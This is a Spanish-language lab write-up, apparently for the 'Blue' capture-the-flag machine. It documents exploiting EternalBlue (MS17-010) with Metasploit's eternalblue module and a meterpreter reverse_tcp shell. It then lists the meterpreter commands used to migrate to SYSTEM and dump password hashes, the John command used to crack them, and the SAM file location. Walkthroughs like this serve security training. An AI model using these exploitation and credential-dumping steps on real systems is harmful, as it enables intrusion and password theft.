# Máquina Blue

## Tareas realizadas
- Escaneo con Nmap para encontrar puertos abiertos y sus respectivos servicios. 
- Se encontró la vulnerabilidad de `MS17-010`. Mejor conocida como **EternalBlue**, el cual afecta servicios de SMB que se encuentran en equipos de windows.
- Esta vulnerabilidad se puede encontrar en las vulnerabilidades y exposiciones comunes (Common Vulnerabilities and Exposures) como `CVE-2017-0144`.
- Se hace uso de metasploit para explotar la vulnerabilidad  `(windows/smb/ms17_010_eternalblue)`
- Se usa el Payload  por defecto, el cual brinda un shell de meterpreter `(windows/meterpreter/reverse_tcp)`
- Se obtiene las contraseñas almacenadas y se procede a crackearlas con `John`


## Comandos utilizados (Metasploit y Meterpreter)

Buscar la vulnerabilidad en los módulos de metasploit 
> `search ms17-010`

Para comprobar nuestro nivel de acceso actual
> `getsystem`

> `getuid`

Para obtener una shell estando en meterpreter
> `shell`

Ver todos los procesos y sus respectivos PID
> `ps`

Escalar Privilegios a través de una migración del proceso. Se busca un proceso el cual tenga permisos de `NT AUTHORITY\SYSTEM`. Esto puede tomar varios intentos, los procesos de migración no son muy estables. Si esto falla, es posible que deba volver a ejecutar el proceso de conversión o reiniciar la máquina y comenzar de nuevo. Si esto sucede, intente con un proceso diferente la próxima vez.
> `migrate <PID>`

Obtener los hash de contraseña almacenados en la máquina.
> `hashdump`

Crackear contraseñas
> `john --format=nt --wordlist=<path-to-wordlist> <hash>`

Ubicación interesante (SAM File)
> `C:\Windows\System32\config`
